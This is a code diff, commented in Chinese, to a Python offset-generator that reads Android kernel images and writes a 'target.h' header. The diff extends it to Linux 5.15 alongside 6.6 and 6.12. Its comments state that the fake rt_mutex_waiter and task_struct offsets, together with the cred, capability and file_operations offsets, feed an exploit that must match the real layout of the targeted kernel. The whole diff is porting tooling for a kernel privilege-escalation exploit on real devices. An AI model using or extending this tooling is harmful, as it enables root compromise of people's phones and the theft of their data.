@@ -95,6 +95,17 @@ RUST_ASHMEM_METHOD_PATTERNS = {
 # 6.12 在 open 之前移除/移动了字段，因此与 6.6 GKI 相比，open/release/show_fdinfo
 # 下移了 8 字节。这里仅列出我们验证/匹配的字段。
 FOPS_LAYOUTS = {
+    # 5.15：在 open/release/show_fdinfo 之前保留了 poll / iterate /
+    # iterate_shared / iopoll 等字段，因此与 6.6 GKI 相比整体下移 0x08，
+    # 且 release 与 splice_read 之间还保留了更多可选 fops 字段（fsync /
+    # fasync / lock / sendpage 等），故 splice_read 再下移 0x10。
+    # 以下偏移量由针对设备真实 5.15.197 源码 + .config 的 offsetof 探针得出。
+    '5.15': {
+        'owner': 0x00, 'llseek': 0x08, 'read': 0x10, 'write': 0x18,
+        'read_iter': 0x20, 'write_iter': 0x28,
+        'ioctl': 0x50, 'compat_ioctl': 0x58, 'mmap': 0x60,
+        'open': 0x70, 'release': 0x80, 'show_fdinfo': 0xe0,
+    },
     '6.6': {
         'owner': 0x00, 'llseek': 0x08, 'read': 0x10, 'write': 0x18,
         'read_iter': 0x20, 'write_iter': 0x28,
@@ -112,6 +123,21 @@ FOPS_LAYOUTS = {
 # 用于生成 target.h 的标准 fops 字段偏移量，按布局版本分组。
 # 这些是写入 target.h 末尾的 FOPS_*_OFF 宏定义。
 FOPS_FIELD_DEFINES = {
+    '5.15': [
+        ("FOPS_OWNER_OFF", "0x00"),
+        ("FOPS_LLSEEK_OFF", "0x08"),
+        ("FOPS_READ_OFF", "0x10"),
+        ("FOPS_WRITE_OFF", "0x18"),
+        ("FOPS_READ_ITER_OFF", "0x20"),
+        ("FOPS_WRITE_ITER_OFF", "0x28"),
+        ("FOPS_IOCTL_OFF", "0x50"),
+        ("FOPS_COMPAT_IOCTL_OFF", "0x58"),
+        ("FOPS_MMAP_OFF", "0x60"),
+        ("FOPS_OPEN_OFF", "0x70"),
+        ("FOPS_RELEASE_OFF", "0x80"),
+        ("FOPS_SPLICE_READ_OFF", "0xc8"),
+        ("FOPS_SHOW_FDINFO_OFF", "0xe0"),
+    ],
     '6.6': [
         ("FOPS_OWNER_OFF", "0x00"),
         ("FOPS_LLSEEK_OFF", "0x08"),
@@ -416,6 +442,15 @@ class KernelImage:
                 return self.syms[alias]
         return None
 
+    def detect_kver(self):
+        """从内核 Image 中检测 主版本.次版本，返回 '5.15'/'6.6'/'6.12' 或 'unknown'。"""
+        m = re.search(rb'Linux version (\d+)\.(\d+)\.\d+', self.img)
+        if m:
+            mm = "%d.%d" % (int(m.group(1)), int(m.group(2)))
+            if mm in ('5.15', '6.6', '6.12'):
+                return mm
+        return 'unknown'
+
     def sym_off(self, name):
         """获取符号相对于 KIMAGE_TEXT_BASE 的偏移量。"""
         addr = self.sym_addr(name)
@@ -463,9 +498,11 @@ class KernelImage:
     def verify_fops_layout(self, fops_sym_name='ashmem_fops', methods=None):
         """通过检查函数指针来验证 file_operations 结构体布局。
 
-        同时尝试 6.6 和 6.12 的 fops 布局。返回：
+        同时尝试 5.15 / 6.6 / 6.12 的 fops 布局（含 CFI 的 .cfi_jt 跳转槽兼容）。
+        返回：
             (layout_name, fops_off, all_ok)
-        其中 layout_name 为 '6.6'、'6.12' 或 None（如果匹配失败）。
+        其中 layout_name 为 '5.15'/'6.6'/'6.12'（匹配成功）或按内核版本检测到的
+        布局（匹配失败，如非标准 CFI-hash fops），all_ok 为 False。
 
         对于 C ashmem：传入 fops_sym_name 来查找符号。
         对于 Rust ashmem：传入 methods 字典 {方法名: 地址}。
@@ -493,11 +530,16 @@ class KernelImage:
             'show_fdinfo':  'ashmem_show_fdinfo',
         }
 
-        # 尝试每种布局
+        # 尝试每种布局（同时兼容 CFI：fops 表中可能存放 .cfi_jt 跳转槽，
+        # 而非裸函数地址，此时需比对 *.cfi_jt 符号）。
         for layout_name, layout in FOPS_LAYOUTS.items():
             all_ok = True
             for method, sym_name in c_ashmem_methods.items():
-                expected = self.sym_addr(sym_name)
+                # CFI 内核下 fops 表存放的是 .cfi_jt 跳转槽地址，而非裸函数地址，
+                # 因此优先比对 *.cfi_jt 符号；非 CFI 内核无该符号时回退到裸地址。
+                expected = self.sym_addr(sym_name + '.cfi_jt')
+                if expected is None:
+                    expected = self.sym_addr(sym_name)
                 actual = self.u64(fops_off + layout[method])
                 if expected is not None and actual is not None:
                     if actual != expected:
@@ -506,8 +548,9 @@ class KernelImage:
             if all_ok:
                 return layout_name, fops_off, True
 
-        # 没有完全匹配的布局；默认使用 6.6
-        return '6.6', fops_off, False
+        # 没有完全匹配的布局（如 MediaTek 5.15 的 ashmem_fops 为非标准
+        # CFI-hash 数据）：回退到按内核版本检测到的布局，而不是硬编码 6.6。
+        return self.detect_kver(), fops_off, False
 
     def _find_rust_ashmem_fops_table(self, methods):
         """通过扫描内核镜像中包含 ashmem 函数指针的结构体，
@@ -612,8 +655,9 @@ class KernelImage:
     def verify_task_offsets(self):
         """使用 init_task 验证 task_struct 字段偏移量。
 
-        同时支持 GKI 6.6 和 6.12 内核布局。尝试每个版本的已知偏移量，
-        如果必要则回退到搜索。
+        根据内核 Image 中检测到的主版本（5.15 / 6.6 / 6.12）选择对应的
+        已知偏移量。偏移量权威值来自针对设备真实内核源码 + .config 的
+        offsetof 探针（见交付报告）。
         """
         init_task_addr = self.sym_addr('init_task')
         init_cred_addr = self.sym_addr('init_cred')
@@ -623,99 +667,103 @@ class KernelImage:
         task_off = self.addr_to_off(init_task_addr)
         results = {}
 
-        # 不同内核版本的已知 task_struct 偏移量。
-        # 每个字段有一组候选偏移量（6.6，然后 6.12）。
-        KNOWN_CANDIDATES = {
-            'TASK_TASKS_OFF':       [0x550, 0x590],
-            'TASK_COMM_OFF':        [0x830],
-            'TASK_REAL_PARENT_OFF': [0x628],
-            'TASK_REAL_CRED_OFF':   [0x818],
-            'TASK_CRED_OFF':        [0x820],
-            'TASK_PID_OFF':         [0x618],
-            'TASK_TGID_OFF':        [0x61c],
-            'TASK_ATOMIC_FLAGS_OFF':[0x5d8],
-            'TASK_SECCOMP_OFF':     [0x8e8],
+        # 按内核版本分组的已知 task_struct 偏移量（权威值）。
+        KNOWN = {
+            '5.15': {
+                'TASK_TASKS_OFF': 0x4d0,
+                'TASK_COMM_OFF': 0x7a8,
+                'TASK_REAL_PARENT_OFF': 0x5e8,
+                'TASK_REAL_CRED_OFF': 0x790,
+                'TASK_CRED_OFF': 0x798,
+                'TASK_PID_OFF': 0x5d8,
+                'TASK_TGID_OFF': 0x5dc,
+                'TASK_ATOMIC_FLAGS_OFF': 0x00,
+                'TASK_SECCOMP_OFF': 0x860,
+            },
+            '6.6': {
+                'TASK_TASKS_OFF': 0x550,
+                'TASK_COMM_OFF': 0x830,
+                'TASK_REAL_PARENT_OFF': 0x628,
+                'TASK_REAL_CRED_OFF': 0x818,
+                'TASK_CRED_OFF': 0x820,
+                'TASK_PID_OFF': 0x618,
+                'TASK_TGID_OFF': 0x61c,
+                'TASK_ATOMIC_FLAGS_OFF': 0x5d8,
+                'TASK_SECCOMP_OFF': 0x8e8,
+            },
+            '6.12': {
+                'TASK_TASKS_OFF': 0x590,
+                'TASK_COMM_OFF': 0x830,
+                'TASK_REAL_PARENT_OFF': 0x628,
+                'TASK_REAL_CRED_OFF': 0x818,
+                'TASK_CRED_OFF': 0x820,
+                'TASK_PID_OFF': 0x618,
+                'TASK_TGID_OFF': 0x61c,
+                'TASK_ATOMIC_FLAGS_OFF': 0x5d8,
+                'TASK_SECCOMP_OFF': 0x8e8,
+            },
         }
+        vkey = self.detect_kver()
+        cand = KNOWN.get(vkey, KNOWN['6.6'])
+        if vkey == 'unknown':
+            print("  [警告] 无法检测内核版本，task 偏移量回退到 6.6",
+                  file=sys.stderr)
 
-        # TASK_TASKS_OFF：在已知偏移量验证自引用的 list_head
-        found = False
-        for off_val in KNOWN_CANDIDATES['TASK_TASKS_OFF']:
-            nxt = self.u64(task_off + off_val)
-            prv = self.u64(task_off + off_val + 8)
-            if nxt is not None and nxt == prv and nxt == init_task_addr + off_val:
-                results['TASK_TASKS_OFF'] = off_val
-                found = True
-                break
-        if not found:
-            # 回退：在 0x500-0x600 范围内搜索自引用的 list_head
-            for candidate in range(0x500, 0x600, 8):
-                n = self.u64(task_off + candidate)
-                p = self.u64(task_off + candidate + 8)
-                if n is not None and n == p and n == init_task_addr + candidate:
-                    results['TASK_TASKS_OFF'] = candidate
-                    break
+        # TASK_TASKS_OFF：验证自引用的 list_head
+        off_val = cand['TASK_TASKS_OFF']
+        nxt = self.u64(task_off + off_val)
+        prv = self.u64(task_off + off_val + 8)
+        if nxt is not None and nxt == prv and nxt == init_task_addr + off_val:
+            results['TASK_TASKS_OFF'] = off_val
 
-        # TASK_COMM_OFF：在已知偏移量验证 "swapper"
-        off_val = KNOWN_CANDIDATES['TASK_COMM_OFF'][0]
+        # TASK_COMM_OFF：验证 "swapper"
+        off_val = cand['TASK_COMM_OFF']
         s = self.read_string(task_off + off_val, 16)
         if s == 'swapper':
             results['TASK_COMM_OFF'] = off_val
-        else:
-            for candidate in range(0x800, 0x900, 0x10):
-                s = self.read_string(task_off + candidate, 16)
-                if s == 'swapper':
-                    results['TASK_COMM_OFF'] = candidate
-                    break
 
         # TASK_REAL_PARENT_OFF：验证指向 init_task
-        off_val = KNOWN_CANDIDATES['TASK_REAL_PARENT_OFF'][0]
+        off_val = cand['TASK_REAL_PARENT_OFF']
         val = self.u64(task_off + off_val)
         if val == init_task_addr:
             results['TASK_REAL_PARENT_OFF'] = off_val
 
         # TASK_REAL_CRED_OFF 和 TASK_CRED_OFF：验证指向 init_cred
-        for name in ['TASK_REAL_CRED_OFF', 'TASK_CRED_OFF']:
-            off_val = KNOWN_CANDIDATES[name][0]
-            val = self.u64(task_off + off_val)
-            if val == init_cred_addr:
-                results[name] = off_val
+        if init_cred_addr is not None:
+            for name in ['TASK_REAL_CRED_OFF', 'TASK_CRED_OFF']:
+                off_val = cand[name]
+                val = self.u64(task_off + off_val)
+                if val == init_cred_addr:
+                    results[name] = off_val
 
         # TASK_PID_OFF 和 TASK_TGID_OFF：验证均为 0
         for name in ['TASK_PID_OFF', 'TASK_TGID_OFF']:
-            off_val = KNOWN_CANDIDATES[name][0]
+            off_val = cand[name]
             val = self.u32(task_off + off_val)
             if val == 0:
                 results[name] = off_val
 
-        # TASK_ATOMIC_FLAGS_OFF：验证为 0
-        off_val = KNOWN_CANDIDATES['TASK_ATOMIC_FLAGS_OFF'][0]
+        # TASK_ATOMIC_FLAGS_OFF：验证为 0（thread_info.flags 位于 task 起始）
+        off_val = cand['TASK_ATOMIC_FLAGS_OFF']
         val = self.u32(task_off + off_val)
         if val is not None and val == 0:
             results['TASK_ATOMIC_FLAGS_OFF'] = off_val
 
         # TASK_SECCOMP_OFF：验证 mode=0, filter_count=0, filter=NULL
-        off_val = KNOWN_CANDIDATES['TASK_SECCOMP_OFF'][0]
+        off_val = cand['TASK_SECCOMP_OFF']
         mode = self.u32(task_off + off_val)
         fcount = self.u32(task_off + off_val + 4)
         filter_ptr = self.u64(task_off + off_val + 8)
         if mode == 0 and fcount == 0 and filter_ptr is not None and filter_ptr == 0:
             results['TASK_SECCOMP_OFF'] = off_val
-        else:
-            # 回退：在 comm 之后搜索 16 字节零模式
-            for candidate in range(0x880, 0x920, 8):
-                m = self.u32(task_off + candidate)
-                fc = self.u32(task_off + candidate + 4)
-                fp = self.u64(task_off + candidate + 8)
-                if m == 0 and fc == 0 and fp is not None and fp == 0:
-                    results['TASK_SECCOMP_OFF'] = candidate
-                    break
 
         return results
 
     def verify_cred_offsets(self):
         """使用 init_cred 验证 cred 结构体字段偏移量。
 
-        使用已知的 GKI 6.6 偏移量作为目标，并通过二进制分析验证它们。
+        按内核版本分组使用已知 GKI 偏移量（权威值来自针对设备真实
+        内核源码 + .config 的 offsetof 探针），并通过二进制分析验证它们。
         """
         init_cred_addr = self.sym_addr('init_cred')
         if init_cred_addr is None:
@@ -724,41 +772,56 @@ class KernelImage:
         cred_off = self.addr_to_off(init_cred_addr)
         results = {}
 
-        # 要验证的已知 GKI 6.6 cred 结构体偏移量
+        cap_full = struct.pack('<Q', 0x000001ffffffffff)
+
+        # 按内核版本分组的已知 cred 结构体偏移量（权威值）。
         KNOWN = {
-            'CRED_UID_OFF': 8,
-            'CRED_SECUREBITS_OFF': 40,
-            'CRED_CAPS_OFF': 48,
-            'CRED_SECURITY_OFF': 128,
+            '5.15': {
+                'CRED_UID_OFF': 0x04,
+                'CRED_SECUREBITS_OFF': 0x24,
+                'CRED_CAPS_OFF': 0x30,
+                'CRED_SECURITY_OFF': 0x78,
+            },
+            '6.6': {
+                'CRED_UID_OFF': 8,
+                'CRED_SECUREBITS_OFF': 40,
+                'CRED_CAPS_OFF': 48,
+                'CRED_SECURITY_OFF': 128,
+            },
+            '6.12': {
+                'CRED_UID_OFF': 8,
+                'CRED_SECUREBITS_OFF': 40,
+                'CRED_CAPS_OFF': 48,
+                'CRED_SECURITY_OFF': 128,
+            },
         }
+        vkey = self.detect_kver()
+        cand = KNOWN.get(vkey, KNOWN['6.6'])
+        if vkey == 'unknown':
+            print("  [警告] 无法检测内核版本，cred 偏移量回退到 6.6",
+                  file=sys.stderr)
 
         # CRED_UID_OFF：uid 应为 0
-        if self.u32(cred_off + KNOWN['CRED_UID_OFF']) == 0:
-            results['CRED_UID_OFF'] = KNOWN['CRED_UID_OFF']
+        off = cand['CRED_UID_OFF']
+        if self.u32(cred_off + off) == 0:
+            results['CRED_UID_OFF'] = off
 
         # CRED_SECUREBITS_OFF：应为 0
-        if self.u32(cred_off + KNOWN['CRED_SECUREBITS_OFF']) == 0:
-            results['CRED_SECUREBITS_OFF'] = KNOWN['CRED_SECUREBITS_OFF']
+        off = cand['CRED_SECUREBITS_OFF']
+        if self.u32(cred_off + off) == 0:
+            results['CRED_SECUREBITS_OFF'] = off
 
-        # CRED_CAPS_OFF：验证 CAP_FULL 模式出现在 caps+8（cap_permitted）
-        # 偏移 48 的 cap_inheritable 对于 init_cred 为 0，偏移 56 的 cap_permitted 为 CAP_FULL
-        cap_full = struct.pack('<Q', 0x000001ffffffffff)
-        cred_bytes = self.read_bytes(cred_off, 128)
-        if cred_bytes:
-            # 查找第一个 CAP_FULL 出现位置
-            for i in range(0, 128, 8):
-                if cred_bytes[i:i+8] == cap_full:
-                    # CRED_CAPS_OFF = 第一个 CAP_FULL - 8（cap_inheritable）
-                    caps_start = i - 8
-                    if caps_start >= 32:  # 合理性检查
-                        results['CRED_CAPS_OFF'] = caps_start
-                    break
+        # CRED_CAPS_OFF：cap_permitted 应为 CAP_FULL（init_cred 拥有全部能力）
+        off = cand['CRED_CAPS_OFF']
+        if self.read_bytes(cred_off + off, 8) == cap_full:
+            results['CRED_CAPS_OFF'] = off
 
         # CRED_SECURITY_OFF：应为 0（init_cred.security 在运行时设置）
-        # 或内核指针
-        val = self.u64(cred_off + KNOWN['CRED_SECURITY_OFF'])
+        # 或内核指针（高 16 位为 0xffff）
+        off = cand['CRED_SECURITY_OFF']
+        val = self.u64(cred_off + off)
         if val is not None and (val == 0 or (val >> 48) == 0xffff):
-            results['CRED_SECURITY_OFF'] = KNOWN['CRED_SECURITY_OFF']
+            results['CRED_SECURITY_OFF'] = off
 
         return results
 
@@ -911,8 +974,14 @@ def get_text_offset(kernel_img):
 
 def generate_targeth(target_name, build_info, kimage_base, phys_offset,
                      text_offset, offsets, verified, device_override=None,
-                     fops_layout='6.6', ashmem_impl='c'):
-    """生成 target.h 文件内容字符串。"""
+                     fops_layout='6.6', ashmem_impl='c', kver='6.6'):
+    """生成 target.h 文件内容字符串。
+
+    kver：检测到的内核主版本（'5.15'/'6.6'/'6.12'），用于选择
+    版本相关的"假结构"偏移量（FAKE_WAITER_*/FAKE_TASK_*）以及
+    task_struct/cred 的回退默认值。这些值来自针对设备真实内核
+    源码 + .config 的 offsetof 探针（见交付报告）。
+    """
 
     kernel_phys_load = phys_offset + text_offset
 
@@ -933,6 +1002,117 @@ def generate_targeth(target_name, build_info, kimage_base, phys_offset,
     else:
         variant_label = f"{device}_{bid_norm}"
     fingerprint = build_info.get('build_fingerprint', 'unknown')
+
+    # 规范化内核版本键
+    if kver not in ('5.15', '6.6', '6.12'):
+        kver = '6.6'
+
+    # ---- 版本相关的"假结构"偏移量（FAKE_WAITER_*/FAKE_TASK_*）----
+    # 这些偏移量会被 exploit 在构造内核读取的假 rt_mutex_waiter /
+    # 假 task_struct 时直接使用，必须与被利用内核的真实结构体布局一致。
+    # 5.15 的 rt_mutex_waiter 为标准布局（单一 prio/deadline 字段），
+    # 而 6.6/6.12 的 rt_mutex_waiter 更大（含独立的 tree/pi prio 字段）。
+    FAKE_WAITER_DEFAULTS = {
+        '5.15': [
+            ("FAKE_WAITER_TREE_PRIO_OFF", "0x44"),
+            ("FAKE_WAITER_TREE_DEADLINE_OFF", "0x48"),
+            ("FAKE_WAITER_PI_TREE_ENTRY_OFF", "0x18"),
+            ("FAKE_WAITER_PI_TREE_PRIO_OFF", "0x44"),
+            ("FAKE_WAITER_PI_TREE_DEADLINE_OFF", "0x48"),
+            ("FAKE_WAITER_TASK_OFF", "0x30"),
+            ("FAKE_WAITER_LOCK_OFF", "0x38"),
+            ("FAKE_WAITER_WAKE_STATE_OFF", "0x40"),
+            ("FAKE_WAITER_WW_CTX_OFF", "0x50"),
+        ],
+        '6.6': [
+            ("FAKE_WAITER_TREE_PRIO_OFF", "0x18"),
+            ("FAKE_WAITER_TREE_DEADLINE_OFF", "0x20"),
+            ("FAKE_WAITER_PI_TREE_ENTRY_OFF", "0x28"),
+            ("FAKE_WAITER_PI_TREE_PRIO_OFF", "0x40"),
+            ("FAKE_WAITER_PI_TREE_DEADLINE_OFF", "0x48"),
+            ("FAKE_WAITER_TASK_OFF", "0x50"),
+            ("FAKE_WAITER_LOCK_OFF", "0x58"),
+            ("FAKE_WAITER_WAKE_STATE_OFF", "0x60"),
+            ("FAKE_WAITER_WW_CTX_OFF", "0x68"),
+        ],
+        '6.12': [
+            ("FAKE_WAITER_TREE_PRIO_OFF", "0x18"),
+            ("FAKE_WAITER_TREE_DEADLINE_OFF", "0x20"),
+            ("FAKE_WAITER_PI_TREE_ENTRY_OFF", "0x28"),
+            ("FAKE_WAITER_PI_TREE_PRIO_OFF", "0x40"),
+            ("FAKE_WAITER_PI_TREE_DEADLINE_OFF", "0x48"),
+            ("FAKE_WAITER_TASK_OFF", "0x50"),
+            ("FAKE_WAITER_LOCK_OFF", "0x58"),
+            ("FAKE_WAITER_WAKE_STATE_OFF", "0x60"),
+            ("FAKE_WAITER_WW_CTX_OFF", "0x68"),
+        ],
+    }
+
+    FAKE_TASK_DEFAULTS = {
+        '5.15': [
+            ("FAKE_TASK_USAGE_OFF", "0x38"),
+            ("FAKE_TASK_PRIO_OFF", "0x7c"),
+            ("FAKE_TASK_NORMAL_PRIO_OFF", "0x84"),
+            ("FAKE_TASK_TASK_GROUP_OFF", "0x400"),
+            ("FAKE_TASK_PI_LOCK_OFF", "0x884"),
+            ("FAKE_TASK_PI_WAITERS_OFF", "0x898"),
+            ("FAKE_TASK_PI_TOP_TASK_OFF", "0x8a8"),
+            ("FAKE_TASK_PI_BLOCKED_ON_OFF", "0x8b0"),
+        ],
+        '6.6': [
+            ("FAKE_TASK_USAGE_OFF", "0x40"),
+            ("FAKE_TASK_PRIO_OFF", "0x84"),
+            ("FAKE_TASK_NORMAL_PRIO_OFF", "0x8c"),
+            ("FAKE_TASK_TASK_GROUP_OFF", "0x348"),
+            ("FAKE_TASK_PI_LOCK_OFF", "0x90c"),
+            ("FAKE_TASK_PI_WAITERS_OFF", "0x920"),
+            ("FAKE_TASK_PI_TOP_TASK_OFF", "0x930"),
+            ("FAKE_TASK_PI_BLOCKED_ON_OFF", "0x938"),
+        ],
+        '6.12': [
+            ("FAKE_TASK_USAGE_OFF", "0x40"),
+            ("FAKE_TASK_PRIO_OFF", "0x84"),
+            ("FAKE_TASK_NORMAL_PRIO_OFF", "0x8c"),
+            ("FAKE_TASK_TASK_GROUP_OFF", "0x348"),
+            ("FAKE_TASK_PI_LOCK_OFF", "0x90c"),
+            ("FAKE_TASK_PI_WAITERS_OFF", "0x920"),
+            ("FAKE_TASK_PI_TOP_TASK_OFF", "0x930"),
+            ("FAKE_TASK_PI_BLOCKED_ON_OFF", "0x938"),
+        ],
+    }
+
+    TASK_DEFAULTS = {
+        '5.15': {
+            'TASK_PID_OFF': 0x5d8, 'TASK_TGID_OFF': 0x5dc,
+            'TASK_REAL_PARENT_OFF': 0x5e8, 'TASK_ATOMIC_FLAGS_OFF': 0x00,
+            'TASK_REAL_CRED_OFF': 0x790, 'TASK_CRED_OFF': 0x798,
+            'TASK_COMM_OFF': 0x7a8, 'TASK_TASKS_OFF': 0x4d0,
+            'TASK_SECCOMP_OFF': 0x860,
+        },
+        '6.6': {
+            'TASK_PID_OFF': 0x618, 'TASK_TGID_OFF': 0x61c,
+            'TASK_REAL_PARENT_OFF': 0x628, 'TASK_ATOMIC_FLAGS_OFF': 0x5d8,
+            'TASK_REAL_CRED_OFF': 0x818, 'TASK_CRED_OFF': 0x820,
+            'TASK_COMM_OFF': 0x830, 'TASK_TASKS_OFF': 0x550,
+            'TASK_SECCOMP_OFF': 0x8e8,
+        },
+        '6.12': {
+            'TASK_PID_OFF': 0x618, 'TASK_TGID_OFF': 0x61c,
+            'TASK_REAL_PARENT_OFF': 0x628, 'TASK_ATOMIC_FLAGS_OFF': 0x5d8,
+            'TASK_REAL_CRED_OFF': 0x818, 'TASK_CRED_OFF': 0x820,
+            'TASK_COMM_OFF': 0x830, 'TASK_TASKS_OFF': 0x590,
+            'TASK_SECCOMP_OFF': 0x8e8,
+        },
+    }
+
+    CRED_DEFAULTS = {
+        '5.15': {'CRED_UID_OFF': 0x04, 'CRED_SECUREBITS_OFF': 0x24,
+                 'CRED_CAPS_OFF': 0x30, 'CRED_SECURITY_OFF': 0x78},
+        '6.6': {'CRED_UID_OFF': 8, 'CRED_SECUREBITS_OFF': 40,
+                'CRED_CAPS_OFF': 48, 'CRED_SECURITY_OFF': 128},
+        '6.12': {'CRED_UID_OFF': 8, 'CRED_SECUREBITS_OFF': 40,
+                 'CRED_CAPS_OFF': 48, 'CRED_SECURITY_OFF': 128},
+    }
 
     # 收集所有符号偏移量
     def off(name):
@@ -1069,33 +1249,14 @@ def generate_targeth(target_name, build_info, kimage_base, phys_offset,
         lines.append(f"#define {name} {val}")
     lines.append("")
 
-    # 假 waiter 结构体偏移量（GKI 6.6 常量）
-    fake_waiter_defs = [
-        ("FAKE_WAITER_TREE_PRIO_OFF", "0x18"),
-        ("FAKE_WAITER_TREE_DEADLINE_OFF", "0x20"),
-        ("FAKE_WAITER_PI_TREE_ENTRY_OFF", "0x28"),
-        ("FAKE_WAITER_PI_TREE_PRIO_OFF", "0x40"),
-        ("FAKE_WAITER_PI_TREE_DEADLINE_OFF", "0x48"),
-        ("FAKE_WAITER_TASK_OFF", "0x50"),
-        ("FAKE_WAITER_LOCK_OFF", "0x58"),
-        ("FAKE_WAITER_WAKE_STATE_OFF", "0x60"),
-        ("FAKE_WAITER_WW_CTX_OFF", "0x68"),
-    ]
+    # 假 waiter 结构体偏移量（按内核版本选择）
+    fake_waiter_defs = FAKE_WAITER_DEFAULTS[kver]
     for name, val in fake_waiter_defs:
         lines.append(f"#define {name} {val}")
     lines.append("")
 
-    # 假 task 结构体偏移量（GKI 6.6 常量）
-    fake_task_defs = [
-        ("FAKE_TASK_USAGE_OFF", "0x40"),
-        ("FAKE_TASK_PRIO_OFF", "0x84"),
-        ("FAKE_TASK_NORMAL_PRIO_OFF", "0x8c"),
-        ("FAKE_TASK_TASK_GROUP_OFF", "0x348"),
-        ("FAKE_TASK_PI_LOCK_OFF", "0x90c"),
-        ("FAKE_TASK_PI_WAITERS_OFF", "0x920"),
-        ("FAKE_TASK_PI_TOP_TASK_OFF", "0x930"),
-        ("FAKE_TASK_PI_BLOCKED_ON_OFF", "0x938"),
-    ]
+    # 假 task 结构体偏移量（按内核版本选择）
+    fake_task_defs = FAKE_TASK_DEFAULTS[kver]
     for name, val in fake_task_defs:
         lines.append(f"#define {name} {val}")
     lines.append("")
@@ -1112,32 +1273,37 @@ def generate_targeth(target_name, build_info, kimage_base, phys_offset,
         lines.append(f"#define {name} {val}")
     lines.append("")
 
-    # Task 结构体偏移量（已验证）
+    # Task 结构体偏移量（已验证；验证失败时使用版本相关默认值）
+    # MM_OWNER_OFF 取决于 mm_struct 布局（随内核版本变化），按版本选择。
+    # 5.15：owner 为 CONFIG_MEMCG 字段，依据 arch/arm64 + 本机 .config 推算为 0x328。
+    MM_OWNER_DEFAULTS = {'5.15': '0x328', '6.6': '1032', '6.12': '1032'}
     task = verified.get('task', {})
+    task_def = TASK_DEFAULTS[kver]
     task_defs = [
-        ("MM_OWNER_OFF", "1032"),
-        ("TASK_PID_OFF", hex(task.get('TASK_PID_OFF', 0x618))),
-        ("TASK_TGID_OFF", hex(task.get('TASK_TGID_OFF', 0x61c))),
-        ("TASK_REAL_PARENT_OFF", hex(task.get('TASK_REAL_PARENT_OFF', 0x628))),
-        ("TASK_ATOMIC_FLAGS_OFF", hex(task.get('TASK_ATOMIC_FLAGS_OFF', 0x5d8))),
-        ("TASK_REAL_CRED_OFF", hex(task.get('TASK_REAL_CRED_OFF', 0x818))),
-        ("TASK_CRED_OFF", hex(task.get('TASK_CRED_OFF', 0x820))),
-        ("TASK_COMM_OFF", hex(task.get('TASK_COMM_OFF', 0x830))),
-        ("TASK_TASKS_OFF", hex(task.get('TASK_TASKS_OFF', 0x550))),
+        ("MM_OWNER_OFF", MM_OWNER_DEFAULTS.get(kver, '1032')),
+        ("TASK_PID_OFF", hex(task.get('TASK_PID_OFF', task_def['TASK_PID_OFF']))),
+        ("TASK_TGID_OFF", hex(task.get('TASK_TGID_OFF', task_def['TASK_TGID_OFF']))),
+        ("TASK_REAL_PARENT_OFF", hex(task.get('TASK_REAL_PARENT_OFF', task_def['TASK_REAL_PARENT_OFF']))),
+        ("TASK_ATOMIC_FLAGS_OFF", hex(task.get('TASK_ATOMIC_FLAGS_OFF', task_def['TASK_ATOMIC_FLAGS_OFF']))),
+        ("TASK_REAL_CRED_OFF", hex(task.get('TASK_REAL_CRED_OFF', task_def['TASK_REAL_CRED_OFF']))),
+        ("TASK_CRED_OFF", hex(task.get('TASK_CRED_OFF', task_def['TASK_CRED_OFF']))),
+        ("TASK_COMM_OFF", hex(task.get('TASK_COMM_OFF', task_def['TASK_COMM_OFF']))),
+        ("TASK_TASKS_OFF", hex(task.get('TASK_TASKS_OFF', task_def['TASK_TASKS_OFF']))),
         ("TASK_THREAD_INFO_FLAGS_OFF", "0x00"),
-        ("TASK_SECCOMP_OFF", hex(task.get('TASK_SECCOMP_OFF', 0x8e8))),
+        ("TASK_SECCOMP_OFF", hex(task.get('TASK_SECCOMP_OFF', task_def['TASK_SECCOMP_OFF']))),
     ]
     for name, val in task_defs:
         lines.append(f"#define {name} {val}")
     lines.append("")
 
-    # Cred 结构体偏移量（已验证）
+    # Cred 结构体偏移量（已验证；验证失败时使用版本相关默认值）
     cred = verified.get('cred', {})
+    cred_def = CRED_DEFAULTS[kver]
     cred_defs = [
-        ("CRED_UID_OFF", str(cred.get('CRED_UID_OFF', 8))),
-        ("CRED_SECUREBITS_OFF", str(cred.get('CRED_SECUREBITS_OFF', 40))),
-        ("CRED_CAPS_OFF", str(cred.get('CRED_CAPS_OFF', 48))),
-        ("CRED_SECURITY_OFF", str(cred.get('CRED_SECURITY_OFF', 128))),
+        ("CRED_UID_OFF", str(cred.get('CRED_UID_OFF', cred_def['CRED_UID_OFF']))),
+        ("CRED_SECUREBITS_OFF", str(cred.get('CRED_SECUREBITS_OFF', cred_def['CRED_SECUREBITS_OFF']))),
+        ("CRED_CAPS_OFF", str(cred.get('CRED_CAPS_OFF', cred_def['CRED_CAPS_OFF']))),
+        ("CRED_SECURITY_OFF", str(cred.get('CRED_SECURITY_OFF', cred_def['CRED_SECURITY_OFF']))),
         ("SELINUX_CRED_BLOB_OFF", "0"),
         ("SELINUX_CRED_OSID_OFF", "0"),
         ("SELINUX_CRED_SID_OFF", "4"),
@@ -1270,7 +1436,9 @@ def main():
 
     # 收集所有符号偏移量
     offsets = {}
-    fops_layout = '6.6'  # 默认值，将由验证更新
+    fops_layout = ki.detect_kver()  # 默认按检测到的内核版本选择布局
+    if fops_layout == 'unknown':
+        fops_layout = '6.6'  # 未知版本时退回 6.6
     ashmem_impl = 'c'    # 默认值，如果检测到 Rust ashmem 则更新
 
     # 检测 ashmem 实现：C（传统）vs Rust（Qualcomm 6.12）
@@ -1405,7 +1573,12 @@ def main():
             fops_layout = layout_name
             print(f"  FOPS 布局：已验证（布局={layout_name}）")
         else:
-            print(f"  FOPS 布局：使用默认 {fops_layout} "
+            # 验证失败：CFI / 非标准 fops 表，回退到内核版本对应的布局
+            kv_layout = ki.detect_kver()
+            if kv_layout == 'unknown':
+                kv_layout = '6.6'
+            fops_layout = kv_layout
+            print(f"  FOPS 布局：验证失败，回退到内核版本布局 {fops_layout} "
                   f"（验证结果：{fops_ok}）")
 
     # 验证 task_struct 偏移量
@@ -1463,10 +1636,14 @@ def main():
         'cred': cred_results or {},
     }
 
+    # 检测内核主版本，用于选择版本相关的"假结构"偏移量
+    kver = ki.detect_kver()
+    print(f"  检测到内核版本：{kver}")
+
     content = generate_targeth(
         target_name, build_info, kimage_base, phys_offset,
         text_offset, offsets, verified, device_override=args.device,
-        fops_layout=fops_layout, ashmem_impl=ashmem_impl
+        fops_layout=fops_layout, ashmem_impl=ashmem_impl, kver=kver
     )
 
     with open(target_path, 'w') as f:
